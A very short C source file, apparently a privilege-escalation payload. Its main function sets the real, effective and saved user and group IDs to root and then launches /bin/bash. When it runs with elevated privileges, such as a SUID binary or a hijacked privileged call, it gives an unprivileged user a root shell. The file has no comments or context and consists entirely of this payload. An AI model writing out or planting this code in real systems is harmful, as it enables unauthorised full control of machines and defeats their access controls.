#include <stdio.h>
#include <stdlib.h>

int main(void){
    setresuid(0, 0, 0);
    setresgid(0, 0, 0);
    system("/bin/bash");
    return 0;
}
